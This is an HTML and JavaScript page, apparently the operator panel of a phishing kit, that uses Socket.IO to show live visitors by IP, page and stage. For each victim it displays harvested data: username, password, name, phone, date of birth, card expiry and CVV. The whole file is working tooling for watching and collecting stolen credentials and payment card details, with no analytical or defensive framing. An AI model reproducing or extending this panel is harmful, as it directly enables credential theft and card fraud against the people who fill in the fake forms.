<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Live User Panel</title>
<!-- Include Bootstrap 5 CSS -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
  /* Existing dark mode styles */
  body.dark-mode {
    background-color: #121212;
    color: #ffffff;
  }
  .dark-mode .card {
    background-color: #272727;
    color: #ffffff;
  }
  .dark-mode .table {
    border-color: #424242;
  }
  .dark-mode .table th,
  .dark-mode .table td {
    border-color: #424242;
    color: #ffffff; /* Ensure text is white */
  }

  .dark-mode .modal-content {
    background-color: #272727;
    color: #ffffff;
  }
  .dark-mode .btn-close {
    filter: invert(1);
  }

  
  /* Add more dark mode styles as needed */
</style>
<!-- Include Socket.IO -->
<script src="/socket.io/socket.io.js"></script>
</head>
<body>

<div class="container mt-4">
  <!-- Dark Mode Toggle Button -->
  <button id="darkModeToggle" class="btn btn-secondary mb-3">Toggle Dark Mode</button>

  <div class="card">
      <div class="card-header d-flex justify-content-between align-items-center">
          <span>Live Connections</span>
      <img src="/logo_webcro.png" alt="Logo" width="60" height="60">
          <span id="activeUserCount" class="badge bg-success">Active Users: 0</span>
      </div>
      <div class="card-body">
          <table class="table" id="connectionsTable">
              <thead>
                  <tr>
                      <th scope="col">Status</th>
                      <th scope="col">IP</th>
                      <th scope="col">Page</th>
                      <th scope="col">Stage</th>
                      <th scope="col">Action</th>
                  </tr>
              </thead>
              <tbody>
                  <!-- User rows will be dynamically inserted here -->
              </tbody>
          </table>
      </div>
  </div>
</div>

  <!-- Modal -->
<div class="modal fade" id="resultsModal" tabindex="-1" aria-labelledby="resultsModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="resultsModalLabel">User Details</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        <!-- Modal body content goes here -->
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>


<!-- Bootstrap 5 JS and Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>

  <script>
 const socket = io();

    socket.on('join', (users) => {
      let count = 0
       users.forEach(([ipAddress, details]) => {
            if(details.status == 'actif'){
              count++;
            }
        });
        updateConnectionsTable(users);
        updateActiveUserCount(count); // Update the count of active users
    });

    socket.on('leave', (users) => {
        let count = 0
       users.forEach(([ipAddress, details]) => {
            if(details.status == 'actif'){
              count++;
            }
        });
        updateConnectionsTable(users);
        updateActiveUserCount(count); // Update the count of active users
    });


    function updateConnectionsTable(users) {
        const tableBody = document.getElementById('connectionsTable').querySelector('tbody');
        tableBody.innerHTML = ''; // Clear existing rows

          users.sort(([ip1, details1], [ip2, details2]) => {
        if (details1.status === 'actif' && details2.status !== 'actif') {
            return -1; // 'actif' comes first
        }
        if (details1.status !== 'actif' && details2.status === 'actif') {
            return 1; // 'actif' comes first
        }
        return 0; // No change in order
    });

        users.forEach(([ipAddress, details]) => {
             let color = details.status === 'actif' ? 'success' : 'danger';
            const row = document.createElement('tr');
            row.innerHTML = `
                <td><span class="badge bg-${color}">${details.status}</span></td>
                <td>${ipAddress}</td>
                <td>${details.page || ''}</td>
                <td>${details.stage || ''}</td>
                <td><button class="btn btn-primary">Results</button></td> <!-- Action column -->
            `;
                  let resultsButton = row.querySelector('button');
        resultsButton.addEventListener('click', function() {
             let modalBody = document.querySelector('#resultsModal .modal-body');
          let ipModel = ipAddress
          socket.emit('getUserData');
          socket.on('setUserData', (userData) => {
           
               userData.forEach(([ipAddress, details]) => {
                 if(details.ip == ipModel){
                   if(details.getUserData){
                     modalBody.innerHTML = `   <div class="card">
        <div class="card-header">
            IP: ${ipAddress}
        </div>
        <ul class="list-group list-group-flush">
            <li class="list-group-item">Username: ${details.getUserData.username || 'N/A'}</li>
            <li class="list-group-item">Password: ${details.getUserData.password || 'N/A'}</li>
            <li class="list-group-item">UserAgent: ${details.getUserData.userAgent || 'N/A'}</li>
            <li class="list-group-item">Fist Name: ${details.getUserData.fname || 'N/A'}</li>
            <li class="list-group-item">Last Name: ${details.getUserData.lname || 'N/A'}</li>
            <li class="list-group-item">Phone Number: ${details.getUserData.phone || 'N/A'}</li>
            <li class="list-group-item">DOB: ${details.getUserData.dob1 || 'N/A'}/${details.getUserData.dob2 || 'N/A'}/${details.getUserData.dob3 || 'N/A'}</li>
            <li class="list-group-item">Exp: ${details.getUserData.exp1 || 'N/A'}/${details.getUserData.exp1 || 'N/A'}</li>
            <li class="list-group-item">Cvv: ${details.getUserData.cvv || 'N/A'}</li>
        </ul>
    </div>`;
                   } else {
                     modalBody.innerHTML = `No result for IP: ${ipAddress}`;
                   }
                 }
               })
           
          })
           
            // Show the modal
            let modal = new bootstrap.Modal(document.getElementById('resultsModal'));
            modal.show();
        });

            tableBody.appendChild(row);
        });
    }

    function updateActiveUserCount(newCount) {
        document.getElementById('activeUserCount').textContent = `Active Users: ${newCount}`;
    }

    document.getElementById('darkModeToggle').addEventListener('click', function() {
        const isDarkMode = document.body.classList.contains('dark-mode');
        if (isDarkMode) {
            this.textContent = 'Toggle Dark Mode';
            document.body.classList.remove('dark-mode');
           document.querySelector('#resultsModal .modal-content').classList.remove('dark-mode');
        } else {
            this.textContent = 'Toggle Light Mode';
            document.body.classList.add('dark-mode');
           document.querySelector('#resultsModal .modal-content').classList.add('dark-mode');
        }
        
        // Update table header colors
        const headers = document.querySelectorAll('#connectionsTable th');
        headers.forEach(header => {
            if (isDarkMode) {
                header.style.color = ''; // Reset to default color
            } else {
                header.style.color = '#ffffff'; // Set to white for dark mode
            }
        });
    });
</script>

</body>
</html>
